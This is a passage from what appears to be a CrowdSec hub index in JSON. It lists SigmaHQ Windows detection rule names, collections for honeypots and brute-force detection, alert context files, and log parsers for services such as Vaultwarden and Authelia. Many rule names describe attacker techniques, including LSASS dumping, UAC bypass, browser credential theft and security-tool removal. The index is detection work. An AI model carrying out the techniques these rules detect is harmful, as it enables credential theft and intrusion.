"sigmahq/proc_creation_win_rar_susp_greedy_compression", "sigmahq/proc_creation_win_rdrleakdiag_process_dumping", "sigmahq/proc_creation_win_reg_add_safeboot", "sigmahq/proc_creation_win_reg_bitlocker", "sigmahq/proc_creation_win_reg_delete_safeboot", "sigmahq/proc_creation_win_reg_delete_services", "sigmahq/proc_creation_win_reg_disable_sec_services", "sigmahq/proc_creation_win_reg_dumping_sensitive_hives", "sigmahq/proc_creation_win_regedit_export_critical_keys", "sigmahq/proc_creation_win_regedit_import_keys_ads", "sigmahq/proc_creation_win_regedit_trustedinstaller", "sigmahq/proc_creation_win_regini_ads", "sigmahq/proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade", "sigmahq/proc_creation_win_registry_install_reg_debugger_backdoor", "sigmahq/proc_creation_win_registry_logon_script", "sigmahq/proc_creation_win_registry_new_network_provider", "sigmahq/proc_creation_win_registry_office_disable_python_security_warnings", "sigmahq/proc_creation_win_registry_privilege_escalation_via_service_key", "sigmahq/proc_creation_win_registry_provlaunch_provisioning_command", "sigmahq/proc_creation_win_registry_set_unsecure_powershell_policy", "sigmahq/proc_creation_win_reg_lsa_disable_restricted_admin", "sigmahq/proc_creation_win_reg_lsa_ppl_protection_disabled", "sigmahq/proc_creation_win_reg_nolmhash", "sigmahq/proc_creation_win_reg_rdp_keys_tamper", "sigmahq/proc_creation_win_reg_susp_paths", "sigmahq/proc_creation_win_regsvr32_http_ip_pattern", "sigmahq/proc_creation_win_regsvr32_remote_share", "sigmahq/proc_creation_win_regsvr32_susp_child_process", "sigmahq/proc_creation_win_regsvr32_susp_exec_path_2", "sigmahq/proc_creation_win_regsvr32_susp_extensions", "sigmahq/proc_creation_win_reg_volsnap_disable", "sigmahq/proc_creation_win_reg_windows_defender_tamper", "sigmahq/proc_creation_win_remote_access_tools_anydesk_silent_install", "sigmahq/proc_creation_win_remote_access_tools_anydesk_susp_exec", "sigmahq/proc_creation_win_renamed_adfind", "sigmahq/proc_creation_win_renamed_autoit", "sigmahq/proc_creation_win_renamed_binary_highly_relevant", "sigmahq/proc_creation_win_renamed_browsercore", "sigmahq/proc_creation_win_renamed_cloudflared", "sigmahq/proc_creation_win_renamed_createdump", "sigmahq/proc_creation_win_renamed_dctask64", "sigmahq/proc_creation_win_renamed_gpg4win", "sigmahq/proc_creation_win_renamed_jusched", "sigmahq/proc_creation_win_renamed_mavinject", "sigmahq/proc_creation_win_renamed_megasync", "sigmahq/proc_creation_win_renamed_msdt", "sigmahq/proc_creation_win_renamed_netsupport_rat", "sigmahq/proc_creation_win_renamed_office_processes", "sigmahq/proc_creation_win_renamed_paexec", "sigmahq/proc_creation_win_renamed_plink", "sigmahq/proc_creation_win_renamed_rundll32_dllregisterserver", "sigmahq/proc_creation_win_renamed_sysinternals_debugview", "sigmahq/proc_creation_win_renamed_sysinternals_procdump", "sigmahq/proc_creation_win_renamed_sysinternals_psexec_service", "sigmahq/proc_creation_win_renamed_sysinternals_sdelete", "sigmahq/proc_creation_win_renamed_vmnat", "sigmahq/proc_creation_win_renamed_whoami", "sigmahq/proc_creation_win_rundll32_ads_stored_dll_execution", "sigmahq/proc_creation_win_rundll32_advpack_obfuscated_ordinal_call", "sigmahq/proc_creation_win_rundll32_inline_vbs", "sigmahq/proc_creation_win_rundll32_keymgr", "sigmahq/proc_creation_win_rundll32_mshtml_runhtmlapplication", "sigmahq/proc_creation_win_rundll32_no_params", "sigmahq/proc_creation_win_rundll32_ntlmrelay", "sigmahq/proc_creation_win_rundll32_process_dump_via_comsvcs", "sigmahq/proc_creation_win_rundll32_registered_com_objects", "sigmahq/proc_creation_win_rundll32_shell32_susp_execution", "sigmahq/proc_creation_win_rundll32_spawn_explorer", "sigmahq/proc_creation_win_rundll32_susp_control_dll_load", "sigmahq/proc_creation_win_rundll32_susp_execution_with_image_extension", "sigmahq/proc_creation_win_rundll32_susp_shellexec_execution", "sigmahq/proc_creation_win_rundll32_susp_shimcache_flush", "sigmahq/proc_creation_win_rundll32_sys", "sigmahq/proc_creation_win_rundll32_unc_path", "sigmahq/proc_creation_win_rundll32_webdav_client_susp_execution", "sigmahq/proc_creation_win_rundll32_without_parameters", "sigmahq/proc_creation_win_sc_change_sevice_image_path_by_non_admin", "sigmahq/proc_creation_win_schtasks_appdata_local_system", "sigmahq/proc_creation_win_schtasks_change", "sigmahq/proc_creation_win_schtasks_creation_temp_folder", "sigmahq/proc_creation_win_schtasks_delete_all", "sigmahq/proc_creation_win_schtasks_delete", "sigmahq/proc_creation_win_schtasks_disable", "sigmahq/proc_creation_win_schtasks_folder_combos", "sigmahq/proc_creation_win_schtasks_one_time_only_midnight_task", "sigmahq/proc_creation_win_schtasks_powershell_persistence", "sigmahq/proc_creation_win_schtasks_reg_loader_encoded", "sigmahq/proc_creation_win_schtasks_schedule_type", "sigmahq/proc_creation_win_schtasks_system", "sigmahq/proc_creation_win_scrcons_susp_child_process", "sigmahq/proc_creation_win_sc_sdset_allow_service_changes", "sigmahq/proc_creation_win_sc_sdset_deny_service_access", "sigmahq/proc_creation_win_sc_sdset_hide_sevices", "sigmahq/proc_creation_win_sc_service_path_modification", "sigmahq/proc_creation_win_sdiagnhost_susp_child", "sigmahq/proc_creation_win_servu_susp_child_process", "sigmahq/proc_creation_win_setres_uncommon_child_process", "sigmahq/proc_creation_win_splwow64_cli_anomaly", "sigmahq/proc_creation_win_spoolsv_susp_child_processes", "sigmahq/proc_creation_win_sqlcmd_veeam_dump", "sigmahq/proc_creation_win_sqlite_chromium_profile_data", "sigmahq/proc_creation_win_sqlite_firefox_gecko_profile_data", "sigmahq/proc_creation_win_ssh_rdp_tunneling", "sigmahq/proc_creation_win_stordiag_susp_child_process", "sigmahq/proc_creation_win_susp_abusing_debug_privilege", "sigmahq/proc_creation_win_susp_add_user_privileged_group", "sigmahq/proc_creation_win_susp_add_user_remote_desktop_group", "sigmahq/proc_creation_win_susp_archiver_iso_phishing", "sigmahq/proc_creation_win_susp_child_process_as_system_", "sigmahq/proc_creation_win_susp_cli_obfuscation_unicode_img", "sigmahq/proc_creation_win_susp_copy_system_dir_lolbin", "sigmahq/proc_creation_win_susp_crypto_mining_monero", "sigmahq/proc_creation_win_susp_data_exfiltration_via_cli", "sigmahq/proc_creation_win_susp_disable_raccine", "sigmahq/proc_creation_win_susp_double_extension_parent", "sigmahq/proc_creation_win_susp_double_extension", "sigmahq/proc_creation_win_susp_download_office_domain", "sigmahq/proc_creation_win_susp_dumpstack_log_evasion", "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_1", "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_2", "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_3", "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_4", "sigmahq/proc_creation_win_susp_etw_modification_cmdline", "sigmahq/proc_creation_win_susp_etw_trace_evasion", "sigmahq/proc_creation_win_susp_eventlog_clear", "sigmahq/proc_creation_win_susp_execution_from_public_folder_as_parent", "sigmahq/proc_creation_win_susp_execution_path", "sigmahq/proc_creation_win_susp_gather_network_info_execution", "sigmahq/proc_creation_win_susp_image_missing", "sigmahq/proc_creation_win_susp_inline_base64_mz_header", "sigmahq/proc_creation_win_susp_inline_win_api_access", "sigmahq/proc_creation_win_susp_lsass_dmp_cli_keywords", "sigmahq/proc_creation_win_susp_non_priv_reg_or_ps", "sigmahq/proc_creation_win_susp_ntds", "sigmahq/proc_creation_win_susp_nteventlogfile_usage", "sigmahq/proc_creation_win_susp_parents", "sigmahq/proc_creation_win_susp_powershell_execution_via_dll", "sigmahq/proc_creation_win_susp_priv_escalation_via_named_pipe", "sigmahq/proc_creation_win_susp_progname", "sigmahq/proc_creation_win_susp_recycle_bin_fake_execution", "sigmahq/proc_creation_win_susp_redirect_local_admin_share", "sigmahq/proc_creation_win_susp_right_to_left_override", "sigmahq/proc_creation_win_susp_script_exec_from_env_folder", "sigmahq/proc_creation_win_susp_script_exec_from_temp", "sigmahq/proc_creation_win_susp_sensitive_file_access_shadowcopy", "sigmahq/proc_creation_win_susp_service_creation", "sigmahq/proc_creation_win_susp_service_dir", "sigmahq/proc_creation_win_susp_service_tamper", "sigmahq/proc_creation_win_susp_shadow_copies_deletion", "sigmahq/proc_creation_win_susp_shell_spawn_susp_program", "sigmahq/proc_creation_win_susp_system_user_anomaly", "sigmahq/proc_creation_win_susp_task_folder_evasion", "sigmahq/proc_creation_win_susp_whoami_as_param", "sigmahq/proc_creation_win_susp_workfolders", "sigmahq/proc_creation_win_svchost_execution_with_no_cli_flags", "sigmahq/proc_creation_win_svchost_termserv_proc_spawn", "sigmahq/proc_creation_win_sysinternals_adexplorer_susp_execution", "sigmahq/proc_creation_win_sysinternals_procdump_evasion", "sigmahq/proc_creation_win_sysinternals_procdump_lsass", "sigmahq/proc_creation_win_sysinternals_psexec_paexec_escalate_system", "sigmahq/proc_creation_win_sysinternals_psexec_remote_execution", "sigmahq/proc_creation_win_sysinternals_psexesvc_as_system", "sigmahq/proc_creation_win_sysinternals_pssuspend_susp_execution", "sigmahq/proc_creation_win_sysinternals_sdelete", "sigmahq/proc_creation_win_sysinternals_susp_psexec_paexec_flags", "sigmahq/proc_creation_win_sysinternals_sysmon_uninstall", "sigmahq/proc_creation_win_systemsettingsadminflows_turn_on_dev_features", "sigmahq/proc_creation_win_taskkill_sep", "sigmahq/proc_creation_win_taskmgr_localsystem", "sigmahq/proc_creation_win_tscon_localsystem", "sigmahq/proc_creation_win_tscon_rdp_redirect", "sigmahq/proc_creation_win_uac_bypass_changepk_slui", "sigmahq/proc_creation_win_uac_bypass_cleanmgr", "sigmahq/proc_creation_win_uac_bypass_cmstp_com_object_access", "sigmahq/proc_creation_win_uac_bypass_cmstp", "sigmahq/proc_creation_win_uac_bypass_computerdefaults", "sigmahq/proc_creation_win_uac_bypass_consent_comctl32", "sigmahq/proc_creation_win_uac_bypass_dismhost", "sigmahq/proc_creation_win_uac_bypass_eventvwr_recentviews", "sigmahq/proc_creation_win_uac_bypass_fodhelper", "sigmahq/proc_creation_win_uac_bypass_icmluautil", "sigmahq/proc_creation_win_uac_bypass_idiagnostic_profile", "sigmahq/proc_creation_win_uac_bypass_ieinstal", "sigmahq/proc_creation_win_uac_bypass_msconfig_gui", "sigmahq/proc_creation_win_uac_bypass_ntfs_reparse_point", "sigmahq/proc_creation_win_uac_bypass_pkgmgr_dism", "sigmahq/proc_creation_win_uac_bypass_trustedpath", "sigmahq/proc_creation_win_uac_bypass_winsat", "sigmahq/proc_creation_win_uac_bypass_wmp", "sigmahq/proc_creation_win_uac_bypass_wsreset_integrity_level", "sigmahq/proc_creation_win_uac_bypass_wsreset", "sigmahq/proc_creation_win_ultravnc_susp_execution", "sigmahq/proc_creation_win_uninstall_crowdstrike_falcon", "sigmahq/proc_creation_win_userinit_uncommon_child_processes", "sigmahq/proc_creation_win_vmware_toolbox_cmd_persistence_susp", "sigmahq/proc_creation_win_vmware_vmtoolsd_susp_child_process", "sigmahq/proc_creation_win_vscode_tunnel_renamed_execution", "sigmahq/proc_creation_win_w32tm", "sigmahq/proc_creation_win_wab_execution_from_non_default_location", "sigmahq/proc_creation_win_wab_unusual_parents", "sigmahq/proc_creation_win_wbadmin_delete_all_backups", "sigmahq/proc_creation_win_webshell_chopper", "sigmahq/proc_creation_win_webshell_hacking", "sigmahq/proc_creation_win_webshell_recon_commands_and_processes", "sigmahq/proc_creation_win_webshell_susp_process_spawned_from_webserver", "sigmahq/proc_creation_win_webshell_tool_recon", "sigmahq/proc_creation_win_werfault_lsass_shtinkering", "sigmahq/proc_creation_win_wermgr_susp_exec_location", "sigmahq/proc_creation_win_wget_download_direct_ip", "sigmahq/proc_creation_win_whoami_execution_from_high_priv_process", "sigmahq/proc_creation_win_whoami_priv_discovery", "sigmahq/proc_creation_win_winget_add_insecure_custom_source", "sigmahq/proc_creation_win_winrm_susp_child_process", "sigmahq/proc_creation_win_wmi_backdoor_exchange_transport_agent", "sigmahq/proc_creation_win_wmic_eventconsumer_creation", "sigmahq/proc_creation_win_wmic_namespace_defender", "sigmahq/proc_creation_win_wmic_susp_execution_via_office_process", "sigmahq/proc_creation_win_wmic_susp_process_creation", "sigmahq/proc_creation_win_wmic_uninstall_security_products", "sigmahq/proc_creation_win_wmiprvse_susp_child_processes", "sigmahq/proc_creation_win_wpbbin_potential_persistence", "sigmahq/proc_creation_win_wscript_cscript_uncommon_extension_exec", "sigmahq/proc_creation_win_wuauclt_dll_loading", "sigmahq/proc_creation_win_wuauclt_no_cli_flags_execution", "sigmahq/proc_creation_win_wusa_cab_files_extraction_from_susp_paths", "sigmahq/proc_creation_win_xwizard_execution_non_default_location"], "version": "0.2", "versions": {"0.1": {"digest": "8fb32d92a284eadffcb050a929082809453196fca29acabcfcefaa37397135d9"}, "0.2": {"digest": "fb99ded13f79ab8968458c52d5b0cc69562010d19ba2a4ecdeb9760b1e2207d7"}}}, "thespad/sshesame": {"content": "parsers:\n  - thespad/sshesame-logs\n  - crowdsecurity/dateparse-enrich\nscenarios:\n  - thespad/sshesame-honeypot\ndescription: \"Collection for sshesame SSH honeypot\"\nauthor: thespad\ntags:\n  - sshesame\n  - ssh\n", "description": "Collection for sshesame SSH honeypot", "parsers": ["thespad/sshesame-logs", "crowdsecurity/dateparse-enrich"], "path": "collections/thespad/sshesame.yaml", "scenarios": ["thespad/sshesame-honeypot"], "version": "0.1", "versions": {"0.1": {"digest": "761e58fae8abf3b8093560273f10dfca4f6681a01ba7e5a41b869b39b10dbfef"}}}, "timokoessler/gitlab": {"content": "parsers:\n  - timokoessler/gitlab-logs\nscenarios:\n  - timokoessler/gitlab-bf\ndescription: \"GitLab support: parser and brute-force detection\"\nauthor: timokoessler\ntags:\n  - linux\n  - brute-force\n  - gitlab", "description": "GitLab support: parser and brute-force detection", "parsers": ["timokoessler/gitlab-logs"], "path": "collections/timokoessler/gitlab.yaml", "scenarios": ["timokoessler/gitlab-bf"], "version": "0.1", "versions": {"0.1": {"digest": "41638aa525b599bf4cef982cf833362d6c698a8fe780d21534800dcf3dd7f7de"}}}, "timokoessler/mongodb": {"content": "parsers:\n  - timokoessler/mongodb-logs\nscenarios:\n  - timokoessler/mongodb-bf\ndescription: \"MongoDB support: parser and brute-force detection\"\nauthor: timokoessler\ntags:\n  - linux\n  - brute-force\n  - mongodb", "description": "MongoDB support: parser and brute-force detection", "parsers": ["timokoessler/mongodb-logs"], "path": "collections/timokoessler/mongodb.yaml", "scenarios": ["timokoessler/mongodb-bf"], "version": "0.1", "versions": {"0.1": {"digest": "5b2ea020a1ac45b47a5b5981c6d913d52c83acb72bdd26b704b1b2c722f5a394"}}}, "timokoessler/uptime-kuma": {"content": "parsers:\n  - timokoessler/uptime-kuma-logs\nscenarios:\n  - timokoessler/uptime-kuma-bf\ndescription: \"Uptime Kuma support: parser and brute-force detection\"\nauthor: timokoessler\ntags:\n  - linux\n  - brute-force\n  - uptime-kuma", "description": "Uptime Kuma support: parser and brute-force detection", "parsers": ["timokoessler/uptime-kuma-logs"], "path": "collections/timokoessler/uptime-kuma.yaml", "scenarios": ["timokoessler/uptime-kuma-bf"], "version": "0.1", "versions": {"0.1": {"digest": "1168b907ae5a3817d3f6fdaa685a4e2bab130a92242cdb3a46dbe8923ae52022"}}}, "xs539/bookstack": {"content": "parsers:\n  - xs539/bookstack-logs\nscenarios:\n  - xs539/bookstack-bf\ndescription: \"Bookstack Support : parser and brute-force detection\"\nauthor: xs539\ntags:\n  - Bookstack", "description": "Bookstack Support : parser and brute-force detection", "parsers": ["xs539/bookstack-logs"], "path": "collections/xs539/bookstack.yml", "scenarios": ["xs539/bookstack-bf"], "version": "0.1", "versions": {"0.1": {"digest": "c8033c7adcf79cb88650944dd5d86c799660b7d74ec5b33e7942d7a5a7f94d14"}}}, "xs539/joplin-server": {"content": "parsers:\n  - xs539/joplin-server-logs\nscenarios:\n  - xs539/joplin-server-bf\ndescription: \"Joplin Server Support : parser and brute-force detection\"\nauthor: xs539\ntags:\n  - Joplin", "description": "Joplin Server Support : parser and brute-force detection", "parsers": ["xs539/joplin-server-logs"], "path": "collections/xs539/joplin-server.yml", "scenarios": ["xs539/joplin-server-bf"], "version": "0.1", "versions": {"0.1": {"digest": "dce7649eb24f0155bcdc443bfd26d88eb25ebe8a5d0775c66be08838e9d48db3"}}}}, "contexts": {"crowdsecurity/appsec_base": {"content": "context:\n  rules:\n    - evt.Meta.rule_name\n  target_uri:\n    - evt.Meta.target_uri\n    - \"(match.uri != nil && match.internal != true) ? match.uri : ''\"\n  name:\n    - \"(match.name != nil && match.internal != true) ? match.name : ''\"\n  method:\n    - \"(match.method != nil && match.internal != true) ? match.method : ''\"\n  matched_zones:\n    - \"(match.matched_zones != nil && match.internal != true) ? match.matched_zones : ''\"\n  msg:\n    - \"(match.msg != nil && match.internal != true) ? match.msg : ''\"\n  ja4h:\n    - \"req.Method != '' ? JA4H(req) :''\"\n  user_agent:\n    - \"req.Method != '' ? req.UserAgent() : ''\"\n", "path": "contexts/crowdsecurity/appsec_base.yaml", "version": "1.1", "versions": {"0.1": {"digest": "df177378b9b01c6c8b67ff5085eda9325c67b337e31d60c4ea95f743783a5e24"}, "0.2": {"digest": "c6df9994a6e82165afa99df96993af81e12d6740e57a8955b96a0bc0a428e2aa"}, "0.3": {"digest": "0d7cb4a7b264644894ea555ddba401c780152b72ef62e7cd99610114cfa0fd3b"}, "0.4": {"digest": "9523c172a9aebbb4422d9cd39eb4ad89221053e522223f7c65ba0bf92f8fa8ff"}, "0.5": {"digest": "c6df9994a6e82165afa99df96993af81e12d6740e57a8955b96a0bc0a428e2aa"}, "0.6": {"digest": "9523c172a9aebbb4422d9cd39eb4ad89221053e522223f7c65ba0bf92f8fa8ff"}, "0.7": {"digest": "def7e20fc031282f232243fb4593464a73b5e7912f1ac07251907d8bcbf9c64f"}, "0.8": {"digest": "9396b98ec05a42d4c63d4ff0dad87147872217b83d8de660463226e5c72b9448"}, "0.9": {"digest": "acf63c94be14ea5b18188739f064fd69f29d2c3ebe6816cf3db652114d1d7090"}, "1.0": {"digest": "f7c92e5d7ab25cb4b0649ec4e27346a89afba35ed96c8cb2ea5142590fb32053"}, "1.1": {"digest": "e86de283b13e25d01104f03e5156c96ae4c306b8ec8dfff4d7103f3f696d25b4"}}}, "crowdsecurity/bf_base": {"content": "#a generic context for bruteforce based scenarios\ncontext:\n  target_user:\n    - evt.Meta.target_user\n", "path": "contexts/crowdsecurity/bf_base.yaml", "version": "0.1", "versions": {"0.1": {"digest": "5b5d0f412ea7da0712fd8e298e9a03642051591adee3817ae529fafa6b66995c"}}}, "crowdsecurity/firewall_base": {"content": "#a generic context for firewall based scenarios\ncontext:\n  dst_port: #Destination port that was targeted\n    - \"evt.Meta.service in ['tcp', 'udp'] ? evt.Meta.service + ':' + evt.Parsed.dst_port : ''\"\n", "path": "contexts/crowdsecurity/firewall_base.yaml", "version": "0.2", "versions": {"0.1": {"digest": "c294017b404dcdb7dfbab5df231fd581999a9af6470847add8cba5d79d049053"}, "0.2": {"digest": "970ff38822f4cbd12321f533d5de42bad2ecef409837ab670e15bf4ce3526935"}}}, "crowdsecurity/fortinet": {"content": "context:\n  sub_type:\n  - evt.Meta.sub_type\n  action:\n  - evt.Meta.action\n  tunnel_type:\n  - evt.Meta.tunnel_type\n  reason:\n  - evt.Meta.reason\n  user:\n  - evt.Meta.target_user", "path": "contexts/crowdsecurity/fortinet.yaml", "version": "0.1", "versions": {"0.1": {"digest": "94562b25f19aa719f89bf9e91ba75d0e490e2faf7ce4f78ee7ebbfb147a59fd3"}}}, "crowdsecurity/http_base": {"content": "#this context file is intended to provide minimal and useful information about HTTP scenarios.\ncontext:\n  target_uri:\n  - evt.Meta.http_path\n  user_agent:\n  - evt.Meta.http_user_agent\n  method:\n  - evt.Meta.http_verb\n  status:\n  - evt.Meta.http_status\n  cve:\n  - evt.Meta.cve\n", "path": "contexts/crowdsecurity/http_base.yaml", "version": "0.3", "versions": {"0.1": {"digest": "a8f832e367aa06576e6c552e839b5e61bedfcb8098bd4049c6a0dff06ecab810"}, "0.2": {"digest": "d0f465d5ff866a91637cd59bc9a18f881bbebf03f8360be9df8182035c927909"}, "0.3": {"digest": "1c15f6bd4f029e7729e7311564d19cff48270d38b697eec85a7884317741d7cf"}}}, "crowdsecurity/http_extended": {"content": "# Include potentiatlly more sensitive HTTP fields (such as the FQDN) in the context\ncontext:\n  target_fqdn:\n  - evt.Meta.target_fqdn\n  - \"req != nil ? req.Host : ''\"\n", "path": "contexts/crowdsecurity/http_extended.yaml", "version": "0.2", "versions": {"0.1": {"digest": "2f4d965e48a8eb7a0b5aebf31061c21869d59a1caa337888d17fa74c251e17aa"}, "0.2": {"digest": "e2dfc9fc55a0c42abf651b29f3ead1917472f6c504077642936614092f2e10a9"}}}, "crowdsecurity/palo_alto": {"content": "context:\n  threat_id:\n  - evt.Meta.threat_id\n  severity:\n  - evt.Meta.severity\n  rule_name:\n  - evt.Meta.rule_name\n", "path": "contexts/crowdsecurity/palo_alto.yaml", "version": "0.1", "versions": {"0.1": {"digest": "828175b3d1934253f4386bca5d0ea630b1b8fd2add24a99660775effae219611"}}}, "crowdsecurity/suricata_base": {"content": "context:\n  alert_signature:\n   - evt.Parsed.suricata_alert_signature\n  dst_port:\n    - evt.Parsed.dest_port\n  # signature_id:\n  #   - evt.Meta.suricata_alert_signature_id\n", "path": "contexts/crowdsecurity/suricata_base.yaml", "version": "0.2", "versions": {"0.1": {"digest": "a4fde8bbce311a7b128ead06027cf8651d1d611414b3cb3e08610671cf65f723"}, "0.2": {"digest": "e354b651c80c05f629930631fcbcb4c72f8e07a6ceacaccd0254cda777e027cb"}}}, "crowdsecurity/sysmon_base": {"content": "#Context for sysmon events, mainly intended to be used with the sigma collection\ncontext:\n  command_line:\n    - evt.Meta.CommandLine\n  current_directory:\n    - evt.Meta.CurrentDirectory\n  user:\n    - evt.Meta.User\n  hashes:\n    - evt.Meta.Hashes\n  parent_image:\n    - evt.Meta.ParentImage", "path": "contexts/crowdsecurity/sysmon_base.yaml", "version": "0.1", "versions": {"0.1": {"digest": "f2d73314a4665599ef69d06af569d659540055409d93ba6b7d315eca0e1ca24d"}}}}, "parsers": {"Dominic-Wagner/vaultwarden-logs": {"content": "onsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'VAULTWARDEN'\"\nname: Dominic-Wagner/vaultwarden-logs\ndescription: \"Parse vaultwarden logs\"\npattern_syntax:\n  DATE_YMD: \"%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day}\"\nnodes:\n  - grok:\n      pattern: '^\\[%{TIMESTAMP_ISO8601:datetimestamp}\\]\\[vaultwarden::api::identity\\]\\[ERROR\\] Username or password is incorrect\\. Try again\\. IP: %{IP:source_ip}\\. Username: %{EMAILADDRESS:username}\\.$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: vaultwarden_failed_auth\n        - meta: username\n          expression: evt.Parsed.username\n  - grok:\n      pattern: '^\\[%{TIMESTAMP_ISO8601:datetimestamp}\\]\\[vaultwarden::api::admin\\]\\[ERROR\\] Invalid admin token. IP: %{IP:source_ip}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: vaultwarden_failed_admin_auth\n  - grok:\n      pattern: '^\\[%{TIMESTAMP_ISO8601:datetimestamp}\\]\\[vaultwarden::api::core::two_factor::authenticator\\]\\[ERROR\\] Invalid TOTP code! Server time: %{DATE_YMD:server_date} %{TIME:server_time} %{TZ:server_tz} IP: %{IP:source_ip}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: vaultwarden_failed_2fa_totp\n  - grok:\n      pattern: '^\\[%{TIMESTAMP_ISO8601:datetimestamp}\\]\\[vaultwarden::api::core::two_factor::email\\]\\[ERROR\\] Token is invalid! IP: %{IP:source_ip}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: vaultwarden_failed_2fa_email\n\nstatics:\n  - meta: service\n    value: vaultwarden\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - target: evt.StrTimeFormat\n    value: \"2006-01-02 15:04:05.000-0700\"\n  - target: evt.StrTime\n    expression: evt.Parsed.datetimestamp\n", "description": "Parse vaultwarden logs", "path": "parsers/s01-parse/Dominic-Wagner/vaultwarden-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "016236c174143284ded1df7e2180c4271b9e7e2e949560aed17b32a00da8c0d6"}, "0.2": {"digest": "45d9d297c5f3901ebea3bcf7de08e339cbcd8259c35ed9f7773298514805d986"}, "0.3": {"digest": "21acb65826b0c2abbfae088811a2c44078af4b52ea6bb97f75b40ad29abf328a"}, "0.4": {"digest": "b17969c51eb64f71a10f960f05ec2a75a359f669f99b7894e970ffcce6e9e373"}}}, "Jgigantino31/ntfy-logs": {"content": "onsuccess: next_stage\nname: Jgigantino31/ntfy-logs\ndescription: \"Parse ntfy logs\"\nfilter: \"evt.Parsed.program == 'ntfy'\"\nnodes:\n  - filter: \"JsonExtract(evt.Parsed.message, 'error_code') in ['40101', '40301']\"\n    statics:\n      - meta: log_type\n        value: ntfy_failed_auth\n\nstatics:\n  - meta: service\n    value: ntfy\n  - meta: source_ip\n    expression: JsonExtract(evt.Parsed.message, \"visitor_ip\")\n  - target: evt.StrTime\n    expression: JsonExtract(evt.Parsed.message, \"time\")\n", "description": "Parse ntfy logs", "path": "parsers/s01-parse/Jgigantino31/ntfy-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "cd4d13630ebab804b258b5228db58c61349daf8f6dd28fb88f1ec94c61298bd3"}}}, "LePresidente/adguardhome-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/adguardhome-logs\ndescription: \"Parse adguardhome logs\"\nfilter: \"evt.Parsed.program == 'adguardhome'\"\nnodes:\n  - grok:\n      pattern: '%{DATE_X:date} %{TIME:time}.* POST %{HOSTNAME} /control/login: from ip %{IP:source_ip}: invalid username or password$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: adguardhome_failed_auth\n  - grok:\n      pattern: '%{DATE_X:date} %{TIME:time}.* POST %{IP:source_ip} /control/login: invalid username or password$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: adguardhome_failed_auth\n\n\nstatics:\n    - meta: service\n      value: adguardhome\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.date + ' ' + evt.Parsed.time\"", "description": "Parse adguardhome logs", "path": "parsers/s01-parse/LePresidente/adguardhome-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "52be900eea2c74174042277698eeaba67bb5111452ace2f454471d1eac87fc55"}, "0.2": {"digest": "41414b5c633037500f61c1ee67f5e2233cb758629468be970180151c523b54f3"}, "0.3": {"digest": "ea7fdd918dccc312f1beca5b8f23cc7ce91e010bfaa876ec51cd4b0bb29b270d"}}}, "LePresidente/authelia-logs": {"content": "debug: false\nname: LePresidente/authelia-logs\nfilter: \"evt.Parsed.program == 'authelia'\"\ndescription: \"Parse Authelia logs\"\npattern_syntax:\n  AUTHELIA_USER: '%{EMAILADDRESS}|%{USERNAME}'\nnodes:\n  ## Main parsing section either it key value pairs or JSON\n  - filter: TrimSpace(evt.Parsed.message) not startsWith \"{\" && ParseKV(evt.Parsed.message, evt.Unmarshaled, \"authelia\") in [\"\", nil]\n    statics:\n      - meta: log_format\n        value: CLF\n  - filter: evt.Unmarshaled.authelia == nil && UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, \"authelia\") in [\"\", nil]\n    statics:\n      - meta: log_format\n        value: JSON\n\n  ## Detect msg contans authentication attempt to parse out user info\n  - grok:\n      pattern: \"%{WORD:auth_status} (1FA|Duo|TOTP|U2F) authentication attempt (made )?by user '%{AUTHELIA_USER:user}'\" \n      expression: evt.Unmarshaled.authelia.msg\n    statics:\n      - meta: log_type\n        expression: 'evt.Parsed.auth_status == \"Unsuccessful\" ? \"auth_failed\" : \"auth_success\"'\n\n  - grok:\n      pattern: \"Error .* getting details for user with username input '%{AUTHELIA_USER:user}'.*\" \n      expression: evt.Unmarshaled.authelia.msg\n    statics:\n      - meta: log_type\n        value: auth_failed\n\n  ## This section is a hack to allow all authelia logs to pass to next stage, if you set onsuccess next stage at root level all successful attempts will not be passed, so we could do some impossible trave sceanrios\n  - filter: evt.Unmarshaled.authelia != nil\n    onsuccess: next_stage\n    statics:\n      - meta: service\n        value: authelia\nstatics:\n    - meta: user\n      expression: evt.Parsed.user\n    - target: evt.StrTime\n      expression: evt.Unmarshaled.authelia.time\n    - meta: source_ip\n      expression: evt.Unmarshaled.authelia.remote_ip\n", "description": "Parse Authelia logs", "path": "parsers/s01-parse/LePresidente/authelia-logs.yaml", "stage": "s01-parse", "version": "0.8", "versions": {"0.1": {"digest": "0d1e7a9e74dc9ce035f8bf45f84dbc8d4741b76f4440d663e8354b87f919913b"}, "0.2": {"digest": "6180a4b745722e87d7cb946dfa8cbd3a2a70949b95c8e159fd4e3470bce944b3"}, "0.3": {"digest": "62b1b7424d5fc1c5aad1da9307b05e1164d1b0948dc578228b67ba10e534225b"}, "0.4": {"digest": "0a5fb148353cb12e099b21a52834965140daa22409fab2e4bfb8580e9a67a04a"}, "0.5": {"digest": "a75c1e4c88511ef40f3d10e086e3a944dbccf20bfb28c6e0a634ffe413bb68f7"}, "0.6": {"digest": "8654df176520c3b4978e0920e8b56af32116c288e5dd3f145f5e0d885d07f3e6"}, "0.7": {"digest": "233529e6e4ca0f1fb1d166b962d28f953bc83a7c64baf73b1d2bdae59eb7ef3a"}, "0.8": {"digest": 